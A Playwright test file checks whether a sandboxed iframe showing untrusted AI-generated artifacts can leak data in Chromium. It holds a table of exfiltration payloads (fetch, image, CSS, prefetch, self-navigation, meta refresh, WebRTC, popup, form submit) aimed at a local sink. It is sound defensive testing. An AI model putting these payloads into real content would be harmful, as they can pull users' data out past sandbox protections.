/**
 * ADR 1017 D1 / M1 — the interactive-artifact frame's egress, measured in a real
 * Chromium, not inferred from attributes.
 *
 * Why this exists: four grades called the `allow-scripts` frame "no egress" because
 * its CSP has no `connect-src`. A browser disagrees. CSP has no directive for a frame
 * navigating ITSELF, a meta refresh fires, and WebRTC ignores the CSP, so untrusted
 * model output could send what it contains to any host the moment it was opened.
 * jsdom cannot see any of that, so this spec loads the exact posture the product
 * renders (`artifactSandbox.ts`) into Chromium with a local HTTP and UDP sink:
 *  - STATIC (`sandbox=""` + `inert`, the default) must send NOTHING, including on a
 *    click or Tab+Enter over a full-frame link (the content can draw a fake "Run").
 *  - RUNNING (`allow-scripts`) DOES leak, by self-navigation, meta refresh and WebRTC.
 *    Those legs pin the premise the consent rests on (if a browser ever closes one,
 *    this goes red and the notice can be revisited), AND they are the positive
 *    controls that prove the HTTP and UDP sinks can see a leak at all, so a STATIC
 *    zero is not the sink being deaf.
 * TCP connections are counted beside HTTP requests, but that does NOT cover a bare
 * `preconnect`: measured for ADR 1021, Chromium 148 opens no preconnect socket to the
 * loopback sink even from an unsandboxed page, so the `preconnect` link in the
 * `prefetch` payload is unobserved and its zero means nothing (ADR 1017 IA67-16).
 * Not covered either: `dns-prefetch` (needs a resolver, IA67-10).
 * Self-contained: no app server, no backend.
 */
import { test, expect, type Page } from '@playwright/test';
import http from 'node:http';
import dgram from 'node:dgram';
import type { AddressInfo } from 'node:net';
import { ARTIFACT_SANDBOX, ARTIFACT_SANDBOX_STATIC, buildArtifactSrcdoc } from '../src/chat/artifacts/artifactSandbox.js';

let hits: string[] = [];
let udpPackets = 0;
let tcpConnections = 0;
let httpServer: http.Server;
let udp: dgram.Socket;
let httpPort = 0;
let udpPort = 0;

test.beforeAll(async () => {
  httpServer = http.createServer((req, res) => { hits.push(req.url ?? ''); res.end('ok'); });
  httpServer.on('connection', () => { tcpConnections += 1; });
  await new Promise<void>((r) => httpServer.listen(0, '127.0.0.1', () => r()));
  httpPort = (httpServer.address() as AddressInfo).port;
  udp = dgram.createSocket('udp4');
  udp.on('message', () => { udpPackets += 1; });
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()));
  udpPort = udp.address().port;
});

test.afterAll(async () => {
  await new Promise<void>((r) => httpServer.close(() => r()));
  udp.close();
});

test.beforeEach(() => { hits = []; udpPackets = 0; tcpConnections = 0; });

const sink = (path: string): string => `http://127.0.0.1:${httpPort}/${path}?d=secret`;

const PAYLOADS = (): Record<string, string> => ({
  fetch: `<script>fetch('${sink('fetch')}').catch(()=>{})</script>`,
  img: `<img src="${sink('img')}">`,
  cssBackground: `<div style="width:10px;height:10px;background:url(${sink('css')})"></div>`,
  prefetch: `<link rel="prefetch" href="${sink('prefetch')}"><link rel="preconnect" href="${sink('preconnect')}">`,
  selfNavigation: `<script>location.href='${sink('selfnav')}'</script>`,
  metaRefresh: `<meta http-equiv="refresh" content="0;url=${sink('meta')}">`,
  webrtc: `<script>try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${udpPort}'}]});pc.createDataChannel('x');pc.createOffer().then(o=>pc.setLocalDescription(o))}catch(e){}</script>`,
  popup: `<script>window.open('${sink('popup')}')</script>`,
  topNavigation: `<script>try{top.location='${sink('top')}'}catch(e){}</script>`,
  form: `<form action="${sink('form')}" method="get"><input name="d" value="secret"></form><script>document.forms[0].submit()</script>`,
});

/** Mount the frame exactly as the product does for the given mode. */
async function mount(page: Page, mode: 'static' | 'running', body: string): Promise<void> {
  await page.setContent('<!doctype html><html><body style="margin:0"><iframe id="f" style="width:400px;height:300px;border:0"></iframe></body></html>');
  await page.evaluate(([sandbox, inert, doc]) => {
    const f = document.getElementById('f') as HTMLIFrameElement;
    f.setAttribute('sandbox', sandbox);
    if (inert) f.setAttribute('inert', '');
    f.setAttribute('referrerpolicy', 'no-referrer');
    f.srcdoc = doc;
  }, [mode === 'static' ? ARTIFACT_SANDBOX_STATIC : ARTIFACT_SANDBOX, mode === 'static', buildArtifactSrcdoc(body)] as const);
  await page.waitForTimeout(1500);
}

test('STATIC (the default): no channel reaches the network', async ({ page }) => {
  for (const [name, body] of Object.entries(PAYLOADS())) {
    hits = []; udpPackets = 0; tcpConnections = 0;
    await mount(page, 'static', body);
    expect({ name, hits, udpPackets, tcpConnections }).toEqual({ name, hits: [], udpPackets: 0, tcpConnections: 0 });
  }
});

test('STATIC: a full-frame link (a fake "Run" button) sends nothing on click or Tab+Enter', async ({ page }) => {
  await mount(page, 'static', `<a href="${sink('click')}" style="position:fixed;inset:0;display:block">Run scripts</a>`);
  await page.mouse.click(200, 150);
  await page.keyboard.press('Tab');
  await page.keyboard.press('Enter');
  await page.waitForTimeout(1000);
  expect(hits).toEqual([]);
});

test('RUNNING: a script can still send data out (the premise the consent rests on, and the sinks\' positive control)', async ({ page }) => {
  await mount(page, 'running', PAYLOADS().selfNavigation!);
  expect(hits).toContain('/selfnav?d=secret');
  hits = [];
  await mount(page, 'running', PAYLOADS().metaRefresh!);
  expect(hits).toContain('/meta?d=secret');
  udpPackets = 0;
  await mount(page, 'running', PAYLOADS().webrtc!);
  expect(udpPackets).toBeGreaterThan(0);
});
